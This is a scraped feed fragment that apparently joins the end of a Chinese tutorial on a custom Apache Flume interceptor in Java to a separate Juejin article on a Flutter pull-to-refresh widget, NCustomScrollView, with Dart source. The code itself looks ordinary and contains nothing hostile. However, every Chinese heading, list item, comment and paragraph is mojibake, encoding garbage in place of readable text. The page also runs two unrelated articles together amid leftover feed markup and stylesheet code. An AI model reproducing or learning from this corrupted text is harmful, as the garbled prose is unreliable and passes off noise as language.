<p>è‡ªå®šä¹‰æ‹¦æˆªå™¨çš„å®ç°ï¼š</p>
<ul>
<li>è·å–eventçš„header</li>
<li>è·å–eventçš„body</li>
<li>è§£æbodyè·å–jsonä¸²</li>
<li>è§£æjsonä¸²è·å–æ—¶é—´æˆ³</li>
<li>å°†æ—¶é—´æˆ³è½¬æ¢ä¸ºå­—ç¬¦ä¸² yyyy-MM-dd</li>
<li>å°†è½¬æ¢åçš„å­—ç¬¦ä¸²æ”¾ç½®headerä¸­</li>
<li>è¿”å›event</li>
</ul>
<h3 data-id="heading-14">å¯¼å…¥ä¾èµ–</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.flume<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>flume-ng-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-15">ç¼–å†™ä»£ç </h3>
<pre><code class="hljs language-shell" lang="shell">package icu.wzk;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.flume.Context;
import org.apache.flume.Event;
import org.apache.flume.interceptor.Interceptor;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CustomerInterceptor implements Interceptor {

    @Override
    public void initialize() {

    }

    @Override
    public Event intercept(Event event) {
        // è¿™é‡Œæ˜¯é€æ¡å¤„ç†
        String eventBody = new String(event.getBody(), StandardCharsets.UTF_8);
        // è·å–Eventçš„Header
        Map&lt;String, String&gt; headerMap = event.getHeaders();
        // è§£æBodyè·å–JSONå­—ç¬¦ä¸²
        String[] bodyArr = eventBody.split("\\s+");
        try {
            String jsonStr = bodyArr[6];
            // è§£æJSONå­—ç¬¦ä¸²è·å–æ—¶é—´æˆ³
            JSONObject jsonObject = JSON.parseObject(jsonStr);
            String timestampStr = jsonObject.getJSONObject("app_active").getString("time");
            // å°†æ—¶é—´æˆ³è½¬æ¢å­—ç¬¦ä¸² yyyy-MM-dd
            // å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºLong
            long timestampLong = Long.parseLong(timestampStr);
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
            Instant instant = Instant.ofEpochMilli(timestampLong);
            LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
            String date = formatter.format(localDateTime);
            // å°†è½¬æ¢åçš„å­—ç¬¦ä¸²æ”¾ç½®headerä¸­
            headerMap.put("logtime", date);
            event.setHeaders(headerMap);
        } catch (Exception e) {
            headerMap.put("logtime", "Unknown");
            event.setHeaders(headerMap);
        }
        return event;
    }

    @Override
    public List&lt;Event&gt; intercept(List&lt;Event&gt; list) {
        List&lt;Event&gt; lstEvent = new ArrayList&lt;&gt;();
        for (Event event : list) {
            Event outEvent = intercept(event);
            if (outEvent != null) {
                lstEvent.add(outEvent);
            }
        }
        return lstEvent;
    }

    @Override
    public void close() {

    }

    public static class Builder implements Interceptor.Builder {
        @Override
        public Interceptor build() {
            return new CustomerInterceptor();
        }
        @Override
        public void configure(Context context) {
        }
    }

}

</code></pre>
<h2 data-id="heading-16">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-17">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-18">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-218 RocketMQ Java API å®æˆ˜ï¼šåŒæ­¥/å¼‚æ­¥ Producer ä¸ Pull/Push Consumer</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQå·²å®Œç»“ï¼ŒRocketMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-19">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutteræœ€ä½³å®è·µï¼šSliveræ—ç½‘ç»œåˆ·æ–°ç»„ä»¶NCustomScrollView]]></title>    <link>https://juejin.cn/post/7600955777315897382</link>    <guid>https://juejin.cn/post/7600955777315897382</guid>    <pubDate>2026-01-30T13:07:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315897382" data-draft-id="7601028900885479470" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutteræœ€ä½³å®è·µï¼šSliveræ—ç½‘ç»œåˆ·æ–°ç»„ä»¶NCustomScrollView"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter"/> <meta itemprop="datePublished" content="2026-01-30T13:07:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SoaringHeart"/> <meta itemprop="url" content="https://juejin.cn/user/3544481219481374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutteræœ€ä½³å®è·µï¼šSliveræ—ç½‘ç»œåˆ·æ–°ç»„ä»¶NCustomScrollView
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3544481219481374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SoaringHeart
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:07:05.000Z" title="Fri Jan 30 2026 13:07:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€éœ€æ±‚æ¥æº</h2>
<p>æœ€è¿‘éœ€è¦å®ç°åµŒå¥—å’Œå¸é¡¶Headeræ»šåŠ¨ä¸‹çš„ä¸‹æ‹‰åˆ·æ–°åŠä¸Šæ‹‰åŠ è½½ã€‚æœ€ç»ˆå®ç°åŸºäº CustomScrollView çš„åˆ·æ–°è§†å›¾ç»„ä»¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3e9bb9de9014aa08abd3f7af32ccb9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29hcmluZ0hlYXJ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383372&amp;x-signature=XdLbIzqDsnlJrKiWsZpBPLZQHrE%3D" alt="simulator_screenshot_5C4883E4-F919-4FFD-BE3D-97E0BCD5C40D.png" loading="lazy"/></p>
<h2 data-id="heading-1">äºŒã€ä½¿ç”¨ç¤ºä¾‹</h2>
<pre><code class="hljs language-dart" lang="dart">Widget buildBodyNew() {
  <span class="hljs-keyword">return</span> NCustomScrollView&lt;<span class="hljs-built_in">String</span>&gt;(
    onRequest: (<span class="hljs-built_in">bool</span> isRefresh, <span class="hljs-built_in">int</span> page, <span class="hljs-built_in">int</span> pageSize, pres) <span class="hljs-keyword">async</span> {
      <span class="hljs-keyword">final</span> length = isRefresh ? <span class="hljs-number">0</span> : pres.length;
      <span class="hljs-keyword">final</span> list = <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt;.generate(pageSize, (i) =&gt; <span class="hljs-string">"item<span class="hljs-subst">${length + i}</span>"</span>);
      DLog.d([isRefresh, list.length]);
      <span class="hljs-keyword">return</span> list;
    },
    headerSliverBuilder: (context, <span class="hljs-built_in">bool</span> innerBoxIsScrolled) {
      <span class="hljs-keyword">return</span> [
        buildPersistentHeader(),
      ];
    },
    itemBuilder: (_, i, e) {
      <span class="hljs-keyword">return</span> ListTile(
        title: Text(<span class="hljs-string">'Item <span class="hljs-subst">$i</span>'</span>),
      );
    },
  );
}
</code></pre>
<h2 data-id="heading-2">ä¸‰ã€æºç </h2>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">//</span>
<span class="hljs-comment">//  NCustomScrollView.dart</span>
<span class="hljs-comment">//  projects</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//  Created by shang on 2026/1/28 14:41.</span>
<span class="hljs-comment">//  Copyright Â© 2026/1/28 shang. All rights reserved.</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">'package:easy_refresh/easy_refresh.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/n_placeholder.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/n_sliver_decorated.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/refresh/easy_refresh_mixin.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/refresh/n_refresh_view.dart'</span>;

<span class="hljs-comment">/// <span class="markdown">åŸºäº CustomScrollView çš„ä¸‹æ‹‰åˆ·æ–°,ä¸Šæ‹‰åŠ è½½æ›´å¤šçš„æ»šåŠ¨åˆ—è¡¨</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> NCustomScrollView({
    <span class="hljs-keyword">super</span>.key,
    <span class="hljs-keyword">this</span>.title,
    <span class="hljs-keyword">this</span>.placeholder = <span class="hljs-keyword">const</span> NPlaceholder(),
    <span class="hljs-keyword">this</span>.contentDecoration = <span class="hljs-keyword">const</span> BoxDecoration(),
    <span class="hljs-keyword">this</span>.contentPadding = <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">0</span>),
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onRequest,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.headerSliverBuilder,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.itemBuilder,
    <span class="hljs-keyword">this</span>.separatorBuilder,
    <span class="hljs-keyword">this</span>.headerBuilder,
    <span class="hljs-keyword">this</span>.footerBuilder,
    <span class="hljs-keyword">this</span>.builder,
  });

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> title;

  <span class="hljs-keyword">final</span> Widget? placeholder;

  <span class="hljs-keyword">final</span> Decoration contentDecoration;

  <span class="hljs-keyword">final</span> EdgeInsets contentPadding;

  <span class="hljs-comment">/// <span class="markdown">è¯·æ±‚æ–¹æ³•</span></span>
  <span class="hljs-keyword">final</span> RequestListCallback&lt;T&gt; onRequest;

  <span class="hljs-comment">/// <span class="markdown">åˆ—è¡¨è¡¨å¤´</span></span>
  <span class="hljs-keyword">final</span> NestedScrollViewHeaderSliversBuilder? headerSliverBuilder;

  <span class="hljs-comment">/// <span class="markdown">ListView çš„ itemBuilder</span></span>
  <span class="hljs-keyword">final</span> ValueIndexedWidgetBuilder&lt;T&gt; itemBuilder;

  <span class="hljs-keyword">final</span> IndexedWidgetBuilder? separatorBuilder;

  <span class="hljs-comment">/// <span class="markdown">åˆ—è¡¨è¡¨å¤´</span></span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Widget&gt; <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">int</span> count)? headerBuilder;

  <span class="hljs-comment">/// <span class="markdown">åˆ—è¡¨è¡¨å°¾</span></span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Widget&gt; <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">int</span> count)? footerBuilder;

  <span class="hljs-keyword">final</span> Widget <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">List</span>&lt;T&gt; items)? builder;

  <span class="hljs-meta">@override</span>
  State&lt;NCustomScrollView&lt;T&gt;&gt; createState() =&gt; _NCustomScrollViewState&lt;T&gt;();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_NCustomScrollViewState</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt;&gt;
    <span class="hljs-title">with</span> <span class="hljs-title">AutomaticKeepAliveClientMixin</span>, <span class="hljs-title">EasyRefreshMixin</span>&lt;<span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt;, <span class="hljs-title">T</span>&gt; </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> wantKeepAlive =&gt; <span class="hljs-keyword">true</span>;

  <span class="hljs-keyword">final</span> scrollController = ScrollController();

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">late</span> RequestListCallback&lt;T&gt; onRequest = widget.onRequest;

  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">List</span>&lt;T&gt; items = &lt;T&gt;[];

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(<span class="hljs-keyword">covariant</span> NCustomScrollView&lt;T&gt; oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    <span class="hljs-keyword">if</span> (widget.title != oldWidget.title ||
        widget.placeholder != oldWidget.placeholder ||
        widget.contentDecoration != oldWidget.contentDecoration ||
        widget.contentPadding != oldWidget.contentPadding ||
        widget.onRequest != oldWidget.onRequest ||
        widget.itemBuilder != oldWidget.itemBuilder ||
        widget.separatorBuilder != oldWidget.separatorBuilder) {
      setState(() {});
    }
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">super</span>.build(context);
    <span class="hljs-keyword">if</span> (items.isEmpty) {
      <span class="hljs-keyword">return</span> GestureDetector(onTap: onRefresh, child: Center(child: widget.placeholder));
    }

    <span class="hljs-keyword">final</span> child = EasyRefresh.builder(
      controller: refreshController,
      onRefresh: onRefresh,
      onLoad: onLoad,
      childBuilder: (_, physics) {
        <span class="hljs-keyword">return</span> CustomScrollView(
          physics: physics,
          slivers: [
            ...(widget.headerBuilder?.call(items.length) ?? []),
            buildContent(),
            ...(widget.footerBuilder?.call(items.length) ?? []),
          ],
        );
      },
    );
    <span class="hljs-keyword">if</span> (widget.headerSliverBuilder == <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">return</span> child;
    }

    <span class="hljs-keyword">return</span> NestedScrollView(
      headerSliverBuilder: widget.headerSliverBuilder!,
      body: child,
    );
  }

  Widget buildContent() {
    <span class="hljs-keyword">if</span> (items.isEmpty) {
      <span class="hljs-keyword">return</span> SliverToBoxAdapter(child: widget.placeholder);
    }

    <span class="hljs-keyword">return</span> NSliverDecorated(
      decoration: widget.contentDecoration,
      sliver: SliverPadding(
        padding: widget.contentPadding,
        sliver: widget.builder?.call(items) ?? buildSliverList(),
      ),
    );
  }

  Widget buildSliverList() {
    <span class="hljs-keyword">return</span> SliverList.separated(
      itemBuilder: (_, i) =&gt; widget.itemBuilder(context, i, items[i]),
      separatorBuilder: (_, i) =&gt; widget.separatorBuilder?.call(context, i) ?? <span class="hljs-keyword">const</span> SizedBox(),
      itemCount: items.length,
    );
  }
}
</code></pre>
<p>æºç ï¼šEasyRefreshMixin.dart</p>
<pre><code class="hljs language-ini" lang="ini">//
//  EasyRefreshMixin.dart
//  projects
//
//  Created by shang on 2026/1/28 14:37.
//  Copyright Â© 2026/1/28 shang. All rights reserved.
//

import 'package:easy_refresh/easy_refresh.dart'<span class="hljs-comment">;</span>
import 'package:flutter/material.dart'<span class="hljs-comment">;</span>
import 'package:flutter_templet_project/basicWidget/refresh/n_refresh_view.dart'<span class="hljs-comment">;</span>

/// EasyRefreshåˆ·æ–° mixin
mixin EasyRefreshMixin&lt;W extends StatefulWidget, T&gt; on State&lt;W&gt; {
  late final <span class="hljs-attr">refreshController</span> = EasyRefreshController(
    controlFinishRefresh: true,
    controlFinishLoad: true,
  )<span class="hljs-comment">;</span>


  /// è¯·æ±‚æ–¹å¼
  late RequestListCallback&lt;T&gt; _onRequest<span class="hljs-comment">;</span>
  RequestListCallback&lt;T&gt; get <span class="hljs-attr">onRequest</span> =&gt; _onRequest<span class="hljs-comment">;</span>
  set onRequest(RequestListCallback&lt;T&gt; value) {
    <span class="hljs-attr">_onRequest</span> = value<span class="hljs-comment">;</span>
  }

  // æ•°æ®åˆ—è¡¨
  List&lt;T&gt; <span class="hljs-attr">_items</span> = []<span class="hljs-comment">;</span>
  List&lt;T&gt; get <span class="hljs-attr">items</span> =&gt; _items<span class="hljs-comment">;</span>
  set items(List&lt;T&gt; value) {
    <span class="hljs-attr">_items</span> = value<span class="hljs-comment">;</span>
  }

  int <span class="hljs-attr">page</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  final int <span class="hljs-attr">pageSize</span> = <span class="hljs-number">20</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">indicator</span> = IndicatorResult.success<span class="hljs-comment">;</span>

  @override
  void dispose() {
    refreshController.dispose()<span class="hljs-comment">;</span>
    super.dispose()<span class="hljs-comment">;</span>
  }

  @override
  void initState() {
    super.initState()<span class="hljs-comment">;</span>

    WidgetsBinding.instance.addPostFrameCallback((_) {
      // DLog.d(<span class="hljs-section">[widget.title, widget.key, hashCode]</span>)<span class="hljs-comment">;</span>
      if (items.isEmpty) {
        onRefresh()<span class="hljs-comment">;</span>
      }
    })<span class="hljs-comment">;</span>
  }

  Future&lt;void&gt; onRefresh() async {
    try {
      <span class="hljs-attr">page</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      final <span class="hljs-attr">list</span> = await <span class="hljs-literal">on</span>Request(<span class="hljs-literal">true</span>, page, pageSize, &lt;T&gt;[])<span class="hljs-comment">;</span>
      items.replaceRange(0, items.length, list)<span class="hljs-comment">;</span>
      page++<span class="hljs-comment">;</span>

      final <span class="hljs-attr">noMore</span> = list.length &lt; pageSize<span class="hljs-comment">;</span>
      if (noMore) {
        <span class="hljs-attr">indicator</span> = IndicatorResult.noMore<span class="hljs-comment">;</span>
      }
      refreshController.finishRefresh()<span class="hljs-comment">;</span>
      refreshController.resetFooter()<span class="hljs-comment">;</span>
    } catch (e) {
      refreshController.finishRefresh(IndicatorResult.fail)<span class="hljs-comment">;</span>
    }
    setState(() {})<span class="hljs-comment">;</span>
  }

  Future&lt;void&gt; onLoad() async {
    if (<span class="hljs-attr">indicator</span> == IndicatorResult.noMore) {
      refreshController.finishLoad()<span class="hljs-comment">;</span>
      return<span class="hljs-comment">;</span>
    }

    try {
      final <span class="hljs-attr">start</span> = (items.length - pageSize).clamp(<span class="hljs-number">0</span>, pageSize)<span class="hljs-comment">;</span>
      final <span class="hljs-attr">prePages</span> = items.sublist(start)<span class="hljs-comment">;</span>
      final <span class="hljs-attr">list</span> = await <span class="hljs-literal">on</span>Request(<span class="hljs-literal">false</span>, page, pageSize, prePages)<span class="hljs-comment">;</span>
      items.addAll(list)<span class="hljs-comment">;</span>
      page++<span class="hljs-comment">;</span>

      final <span class="hljs-attr">noMore</span> = list.length &lt; pageSize<span class="hljs-comment">;</span>
      if (noMore) {
        <span class="hljs-attr">indicator</span> = IndicatorResult.noMore<span class="hljs-comment">;</span>
      }
      refreshController.finishLoad(indicator)<span class="hljs-comment">;</span>
    } catch (e) {
      refreshController.finishLoad(IndicatorResult.fail)<span class="hljs-comment">;</span>
    }
    setState(() {})<span class="hljs-comment">;</span>
  }
}
</code></pre>
<h2 data-id="heading-3">æœ€åã€æ€»ç»“</h2>
<p>1ã€å½“é¡µé¢æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦å¸é¡¶æˆ–è€…åµŒå¥—æ»šåŠ¨æ—¶å°±å¿…é¡»ä½¿ç”¨ Sliver ç›¸å…³ç»„ä»¶ï¼Œå¦åˆ™ä¼šæœ‰æ»šåŠ¨è¡Œæ–‡å†²çªã€‚</p>
<p>2ã€NCustomScrollView æ”¯æŒé¡¶éƒ¨å¸é¡¶ç»„ä»¶è‡ªå®šä¹‰ï¼›åº•éƒ¨åˆ—è¡¨å¤´ï¼Œåˆ—è¡¨å°¾è®¾ç½®ï¼Œæ”¯æŒsliver è®¾ç½® Decorationã€‚</p>
